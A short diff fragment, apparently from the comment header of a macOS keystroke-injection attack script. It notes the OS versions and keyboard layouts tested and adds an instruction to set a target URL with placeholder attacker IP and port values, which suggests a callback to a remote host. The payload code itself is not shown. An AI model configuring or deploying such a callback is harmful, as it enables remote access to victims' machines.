@@ -24,6 +24,8 @@ open -a Calculator
 
 Tested on:
 OSX 10.15.7 and 12.4 - without mod works with US and DE Layout both
+
+CHANGE TARGET IN URL LINE 56 !!!!! ip=YOURIP -d port=YOURPORT
  
 */
 
